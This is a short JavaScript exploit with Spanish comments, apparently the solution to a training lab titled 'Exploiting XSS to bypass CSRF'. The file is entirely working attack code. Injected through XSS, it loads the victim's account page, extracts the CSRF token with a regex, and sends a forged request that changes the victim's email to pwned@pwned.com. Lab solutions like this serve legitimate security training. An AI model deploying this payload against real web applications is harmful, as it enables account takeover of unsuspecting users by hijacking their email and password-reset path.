/**
 * Lab: Exploiting XSS to bypass CSRF
 * Goal: Automatically change a victim's email by stealing their CSRF token via XSS.
 */

// 1. Realizamos una petición GET a la página donde reside el formulario de cambio de correo
var req = new XMLHttpRequest();
req.open("GET", "/my-account", false); // Petición síncrona para simplificar el flujo del exploit
req.send();

// 2. Extraemos el token CSRF de la respuesta usando Regex (Expresiones Regulares)
var response = req.responseText;
var csrf_token = response.match(/name="csrf" value="(.*?)"/)[1];

// 3. Configuramos la segunda petición (POST) para realizar el cambio de correo
var req2 = new XMLHttpRequest();
req2.open('POST', '/my-account/change-email', true);
req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

// 4. Construimos el payload con el nuevo correo y el token robado
var data = "email=" + encodeURIComponent("pwned@pwned.com") + "&csrf=" + encodeURIComponent(csrf_token);

// 5. Enviamos la petición maliciosa en nombre de la víctima
req2.send(data);
